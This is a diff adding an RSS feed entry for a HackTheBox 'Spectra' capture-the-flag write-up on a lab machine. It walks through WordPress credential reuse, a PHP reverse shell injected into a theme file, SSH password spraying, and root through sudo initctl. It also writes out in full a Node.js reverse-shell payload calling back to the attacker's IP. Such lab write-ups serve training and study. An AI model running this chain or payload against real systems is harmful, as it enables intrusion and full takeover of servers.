@@ -8,6 +8,370 @@
     <lastBuildDate>Sat, 26 Jun 2021 21:27:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/wordpress/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Spectra</title>
+      <link>https://fahmifj.github.io/hackthebox/spectra/</link>
+      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/spectra/</guid>
+      <description>Getting password from automatic login script of ChromeOS</description>
+      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a WordPress website, which has a directory listing enabled, thus exposing its source code. Examining the source reveals a database password that is reused by the wordpress admin. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Enumerating the internal discovers an auto-login password, and it is reused by a user. The user has sudo permissions on <code>initctl</code>, which can be exploited to get a root shell.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>WordPress exploitation</li>
+<li>Command injection</li>
+<li>Sudo exploitation on initctl</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-15 10:10 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.229
+Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.052s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> closed ports
+Reason: <span class="m">65532</span> resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.17.4
+3306/tcp open  mysql   syn-ack ttl <span class="m">63</span> MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 123.14 seconds
+</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
+<p>Running a script scan didn&rsquo;t find any interesting information.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
+<p>The site appears to be under development.</p>
+<p><div class="img-container"><img src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  /></div>
+</p>
+<p>Inspecting page source discovers a hostname and two directories:</p>
+<ul>
+<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
+<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
+</ul>
+<p><div class="img-container"><img src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  /></div>
+</p>
+<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
+$ curl -s http://spectra.htb/ <span class="p">|</span> wc -c
+<span class="m">283</span>
+→ root@kali «~» «10.10.14.9» 
+$ curl -s http://10.10.10.229 <span class="p">|</span> wc -c
+<span class="m">283</span>
+</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
+<p><div class="img-container"><img src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  /></div>
+</p>
+<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
+<p><div class="img-container"><img src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  /></div>
+</p>
+<p>Removing <code>index.php</code> from URL, reveals that this page has directory listing enabled.</p>
+<p><div class="img-container"><img src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  /></div>
+</p>
+<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ curl http://spectra.htb/testing/wp-config.php.save
+&lt;?php
+...&lt;SNIP&gt;...
+
+define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL database username */
+define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;devtest&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL database password */
+define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;devteam01&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL hostname */
+define<span class="o">(</span> <span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span> <span class="o">)</span><span class="p">;</span>
+...&lt;SNIP&gt;...
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-nginx">Shell as nginx</h3>
+<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
+<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
+<p><div class="img-container"><img src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  /></div>
+</p>
+<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
+<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
+<p><div class="img-container"><img src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  /></div>
+</p>
+<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
+<p><div class="img-container"><img src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  /></div>
+</p>
+<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
+<p><div class="img-container"><img src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  /></div>
+</p>
+<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
+</code></pre></div><p>On my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ nc -nvlp <span class="m">9001</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">35166</span>
+Linux spectra 5.4.66+ <span class="c1">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
+ 09:14:42 up 10:53,  <span class="m">0</span> users,  load average: 0.02, 0.04, 0.00
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
+$ hostname
+spectra
+</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
+<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ which python3
+which: no python3 in <span class="o">((</span>null<span class="o">))</span>
+$ ls /usr/bin/ <span class="p">|</span> grep python 
+python
+python-config
+python-wrapper
+python2
+python2.7
+python3
+python3.6
+python3.6m
+$ /usr/bin/python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+nginx@spectra / $ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+nginx@spectra / $ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> suspended  nc -nvlp <span class="m">9001</span>
+→ root@kali «spectra» «10.10.14.21» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> continued  nc -nvlp <span class="m">9001</span>
+
+nginx@spectra / $ 
+</code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
+<span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nv">USER</span><span class="o">=</span>nginx
+<span class="nv">PWD</span><span class="o">=</span>/
+<span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
+<span class="nv">HOME</span><span class="o">=</span>/home/nginx
+<span class="nv">_</span><span class="o">=</span>/usr/bin/env
+nginx@spectra / $ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/bin 
+nginx@spectra / $ which python
+/usr/local/bin/python
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-katie">Shell as katie</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>There are 4 users with login shell in this machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd <span class="p">|</span> grep sh$  
+root:x:0:0:root:/root:/bin/bash
+chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
+nginx:x:20155:20156::/home/nginx:/bin/bash
+katie:x:20156:20157::/home/katie:/bin/bash
+</code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
+...&lt;SNIP&gt;...
+/home/katie:
+total <span class="m">8</span>
+drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
+-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
+...&lt;SNIP&gt;...
+</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
+/usr/local/share/nginx/html/main/wp-config.php
+/usr/local/share/nginx/html/testing/wp-config.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
+/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
+</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
+...&lt;SNIP&gt;...
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database <span class="k">for</span> WordPress */
+define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL database username */
+define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
+
+/** MySQL database password */
+define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;development01&#39;</span> <span class="o">)</span><span class="p">;</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
+<span class="c1"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
+<span class="c1"># Use of this source code is governed by a BSD-style license that can be</span>
+<span class="c1"># found in the LICENSE file.</span>
+description   <span class="s2">&#34;Automatic login at boot&#34;</span>
+author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
+<span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
+<span class="c1"># input.</span>
+start on started boot-complete
+script
+  <span class="nv">passwd</span><span class="o">=</span>
+  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
+  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
+    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
+      <span class="nb">break</span>
+    <span class="k">fi</span>
+  <span class="k">done</span>
+  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">exit</span> <span class="m">0</span>
+  <span class="k">fi</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
+<ul>
+<li><code>/mnt/stateful_partition/etc/autologin</code></li>
+<li><code>/etc/autologin</code></li>
+</ul>
+<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
+total <span class="m">4</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">19</span> Feb  <span class="m">3</span> 16:43 passwd
+nginx@spectra /opt $ cat /etc/autologin/passwd 
+SummerHereWeCome!!
+</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
+<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell. Within a few sec, it returns that <code>katie:SummerHereWeCome!!</code> are the valid credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.1
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:SummerHereWeCome!! Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>+<span class="o">]</span> katie:SummerHereWeCome!!
+</code></pre></div><p>I&rsquo;m able to login via SSH</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ ssh katie@10.10.10.229
+Password: 
+katie@spectra ~ $ id 
+<span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
+</code></pre></div><p>User flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
+total <span class="m">36</span>
+drwxr-xr-x <span class="m">5</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .
+drwxr-xr-x <span class="m">8</span> root  root  <span class="m">4096</span> Feb  <span class="m">2</span> 15:55 ..
+lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Feb  <span class="m">2</span> 15:55 .bash_history -&gt; /dev/null
+-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">127</span> Dec <span class="m">22</span> 05:46 .bash_logout
+-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">204</span> Dec <span class="m">22</span> 05:46 .bash_profile
+-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">551</span> Dec <span class="m">22</span> 05:46 .bashrc
+drwx------ <span class="m">2</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .gnupg
+drwx------ <span class="m">3</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 .pki
+drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
+-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration-1">Internal Enumeration</h4>
+<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
+</code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
+    <span class="m">32121</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test6.conf
+    <span class="m">32123</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test7.conf
+    <span class="m">32109</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test3.conf
+    <span class="m">32112</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test4.conf
+    <span class="m">32103</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test.conf
+    <span class="m">32126</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test8.conf
+    <span class="m">32128</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test9.conf
+    <span class="m">32106</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test10.conf
+    <span class="m">32108</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test2.conf
+    <span class="m">32120</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test5.conf
+    <span class="m">32105</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test1.conf
+    <span class="m">23763</span>      <span class="m">4</span> -rwxrwxr-x   <span class="m">1</span> root     developers      <span class="m">251</span> Jun <span class="m">29</span>  <span class="m">2020</span> /srv/nodetest.js
+</code></pre></div><p>These <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  The JS file itself is not that important here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
+description <span class="s2">&#34;Test node.js server&#34;</span>
+author      <span class="s2">&#34;katie&#34;</span>
+
+start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
+stop on shutdown
+
+script
+
+    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
+    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
+    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
+<p>With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.</p>
+<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
+<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
+$ cat exploit.conf
+description <span class="s2">&#34;Test node.js server&#34;</span>
+author      <span class="s2">&#34;katie&#34;</span>
+
+start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
+stop on shutdown
+
+script
+
+    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
+    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
+    <span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>10.10.14.21
+    <span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">9001</span>
+    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span class="s1">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
+</span><span class="s1">    this.pipe(sh.stdin);
+</span><span class="s1">    sh.stdout.pipe(this);
+</span><span class="s1">    sh.stderr.pipe(this);
+</span><span class="s1">    })&#39;</span>
+    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
+$ scp exploit.conf katie@10.10.10.229:/dev/shm
+Password:
+bash: warning: /home/katie/.bashrc: warning: script from noexec mount<span class="p">;</span> see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
+exploit.conf                               100%  <span class="m">775</span>    13.1KB/s   00:00
+</code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null<span class="p">;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span class="o">&amp;&amp;</span> sudo /sbin/initctl start test5
+test5 start/running, process <span class="m">33889</span>
+</code></pre></div><p>If I check my listener, I have a root shell now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21»
+$ nc -nvlp <span class="m">9001</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">37220</span>
+id <span class="o">&amp;&amp;</span> hostname <span class="o">&amp;&amp;</span> ip a
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+spectra
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
+    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
+       valid_lft 86303sec preferred_lft 14303sec
+    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
+       valid_lft 86303sec preferred_lft 14303sec
+    inet6 fe80::250:56ff:feb9:b2c/64 scope link
+       valid_lft forever preferred_lft forever
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210715085053464.png" alt="image-20210715085053464"  /></div>
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
+<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
+<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Spectra</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
       <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
       
@@ -366,6 +730,489 @@ spectra
 <li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
 <li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
